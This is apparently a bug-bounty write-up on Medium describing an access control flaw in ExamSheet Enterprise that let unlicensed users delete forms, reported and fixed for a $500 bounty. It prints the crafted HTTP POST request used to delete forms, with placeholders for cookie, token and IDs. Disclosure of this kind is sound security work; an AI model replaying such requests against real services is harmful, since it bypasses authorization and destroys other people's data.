---
title: Unauthorized Deletion of Forms by Low-Level Unlicensed Users: A 500$ Access Control Bug
url: https://infosecwriteups.com/unauthorized-deletion-of-forms-by-low-level-unlicensed-users-a-500-access-control-bug-98dc50c8c193?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2024-09-11
fetch_date: 2025-10-06T18:26:49.008249
---

# Unauthorized Deletion of Forms by Low-Level Unlicensed Users: A 500$ Access Control Bug

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F98dc50c8c193&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Funauthorized-deletion-of-forms-by-low-level-unlicensed-users-a-500-access-control-bug-98dc50c8c193&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Funauthorized-deletion-of-forms-by-low-level-unlicensed-users-a-500-access-control-bug-98dc50c8c193&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[Mastodon](https://me.dm/%40a13h1)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-98dc50c8c193---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-98dc50c8c193---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# Unauthorized Deletion of Forms by Low-Level Unlicensed Users: A 500$ Access Control Bug

[![Abhi Sharma](https://miro.medium.com/v2/resize:fill:64:64/1*sBSRPckiQ7rHLIsqREevhw.png)](https://medium.com/%40a13h1?source=post_page---byline--98dc50c8c193---------------------------------------)

[Abhi Sharma](https://medium.com/%40a13h1?source=post_page---byline--98dc50c8c193---------------------------------------)

3 min read

·

Aug 24, 2024

--

3

Listen

Share

**Hi Everyone,** Today, I’m excited to share a vulnerability I discovered in ExamSheet Enterprise. This security flaw allows low-level, unlicensed users to delete forms, despite lacking the necessary permissions and plan. This issue undermines the core principles of access control and earned me a bounty of $500.

Press enter or click to view image in full size

![]()

> **Understanding the Target: ExamSheet Enterprise**

ExamSheet Enterprise is a powerful platform designed for sheet management and automation. It allows users to create, manage, and share sheets, forms, and workflows across different teams and departments. However, a vulnerability in the access control system allows unlicensed users to delete forms, posing a significant risk to data integrity and security.

> **The Vulnerability: Unauthorized Form Deletion**

In ExamSheet, form deletion is supposed to be restricted to licensed users with specific permissions. However, I found that unlicensed users could bypass these restrictions and delete forms using crafted HTTP requests. This vulnerability highlights a significant gap in the access control mechanism, potentially allowing unauthorized data deletion and compromising the integrity of the platform.

> **Understanding the Bug Type: Improper Handling of Insufficient Permissions**

This vulnerability falls under **Improper Handling of Insufficient Permissions or Privileges**. It occurs when an application does not properly enforce access controls, allowing users with insufficient permissions to perform restricted actions. In this case, ExamSheet failed to adequately check user permissions for form deletion, allowing unlicensed users to delete forms.

### **How It Works:**

1. **Access Control Flaw**: ExamSheet’s system does not correctly enforce role-based access controls, allowing users without proper permissions to delete forms.
2. **Request Manipulation**: By crafting a specific HTTP request, an unlicensed user can delete a form, bypassing the intended access restrictions.
3. **Privilege Escalation**: The vulnerability arises from insufficient checks on user permissions, allowing actions that should be restricted to licensed users.

## Steps to Reproduce

* Log in with a user account that does not have a license for the ExamSheet platform.
* Use the following HTTP POST request to delete forms:

```
POST /b/home?formName=ajax&formAction=fa_deleteGridForm&es_v=268.0.0 HTTP/2
Host: app.examsheet.com
Cookie: ---low level user cookie----
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
ExamSheet-Nep: formName,formAction,errorAsJson,parm1,parm2
X-Exam-Xsrf:  ---------your low level user token---------
Content-Length: 109
Origin: https://app.examsheet.com
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

formName=ajax&formAction=fa_deleteGridForm&errorAsJson=true&parm1=----form-id----&parm2=---sheet-id---&parm3=&parm4=
```

* Add value in`param1` and `param2` with the actual form ID and sheet ID.
* Submit the request. A response code of 200 with a message of “success” and “0,0,” indicates that the form was successfully deleted.

```
setAjaxResponseStatus(true,0,'success',0,0,'[]');
```

> **Impact:**

This vulnerability significantly undermines ExamSheet’s role-based access control and user privilege management. It allows unauthorized users to delete forms, actions that should be restricted to licensed users, leading to:

* **Unauthorized Data Deletion**: Unlicensed users can delete forms, leading to potential loss of critical data.
* **Compromised Data Integrity**: The ability to delete forms without proper authorization can result in unauthorized changes or deletions, affecting the integrity of the data.

> **Response and Resolution**

Upon discovering this vulnerability, I promptly reported it to the ExamSheet security team. The issue was reviewed, and a bounty of $500 was awarded for identifying and reporting the flaw. The ExamSheet security team is implemented a fix to ensure that form deletion actions are appropriately restricted to licensed users.

![]()

> **Takeaway: Testing for Unauthorized Action Replays**

The essential takeaway from this discovery is the importance of testing for unauthorized action. ExamSheet’s system explicitly restricts form deletion to licensed users, yet by using a direct api request, it was possible to bypass these restrictions. This highlights the necessity of ensuring that actions, especially those involving data manipulation, cannot be played by unauthorized users.

> **Support and Follow**

If you found this write-up insightful, please leave a clap and share your feedback in the comments. Follow me for more exciting findings and cybersecurity tips!

> Find me on Twitter: [@a13h1\_](https://twitter.com/a13h1_)

### Thank you for your continued support. Keep clapping, commenting, and sharing your thoughts!

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----98dc50c8c193---------------------------------------)

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----98dc50c8c193---------------------------------------)

[Access Control](https://medium.com/tag/access-control?source=post_page-----98dc50c8c193-------...